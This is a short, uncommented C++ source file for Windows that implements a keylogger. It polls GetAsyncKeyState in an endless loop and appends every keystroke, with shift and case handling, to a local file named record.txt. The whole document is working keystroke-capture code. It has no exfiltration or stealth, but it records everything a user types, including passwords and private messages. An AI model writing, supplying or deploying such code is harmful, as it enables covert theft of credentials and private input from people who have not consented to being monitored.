#include <iostream>
#include <winuser.h>
#include <windows.h>
#include <fstream>
using namespace std;


int main()
{
    char key;
    for (; ; )
    {
        for (key=8;key<222 ;key++ )
        {
                if( GetAsyncKeyState(key) == -32767 )
                {
                    ofstream write("record.txt", ios::app);
                     if (  !(GetAsyncKeyState(0x10)) ) //0x10 is the notation for SHIFT Key
                        {
                              if ((key>64) && (key<91))
                              {
                                       key+=32;
                              write << key;
                              break;
                              }
                              write<<key;
                        }

                        else if ( key>64 && key<91 )
                        {
                              write << key;
                              break;
                        }
                        else
                        {
                              switch (key)
                              {
                                    case  48: write<< ")";  break;
                                    case  49: write<< "!";  break;
                                    case  50: write<< "@";  break;
                                    case  51: write<< "#";  break;
                                    case  52: write<< "$";  break;
                                    case  53: write<< "%";  break;
                                    case  54: write<< "^";  break;
                                    case  55: write<< "&";  break;
                                    case  56: write<< "*";  break;
                                    case  57: write<< "(";  break;
                                    default: write<<key;
                              }
                        }
                }
        }
    }
    return 0;
}
